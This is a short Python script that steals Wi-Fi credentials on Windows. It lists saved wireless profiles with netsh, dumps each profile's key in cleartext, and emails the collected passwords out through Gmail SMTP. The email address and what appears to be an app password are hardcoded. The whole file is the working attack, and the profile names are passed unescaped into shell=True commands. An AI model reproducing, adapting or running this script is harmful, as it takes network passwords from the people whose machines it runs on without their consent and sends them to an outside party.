import subprocess
import re
import time
import smtplib

def send_mail(email, password, message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, message)
    server.quit()

command = "netsh wlan show profile"
networks = subprocess.check_output(command, shell=True).decode('utf-8')  # Decode the bytes to a string
network_names_list = re.findall("(?:Profile\\s*:\\s)(.*)", networks)  # Use the correct regex escape sequence for backslash

result = ""
for network_name in network_names_list:
  command = "netsh wlan show profile " + network_name + " key=clear"
  current_result = subprocess.check_output(command, shell=True).decode('utf-8')
  result = result + current_result

send_mail("ruymhdi1@gmail.com", "bojvzyzbyvhheuxg", result)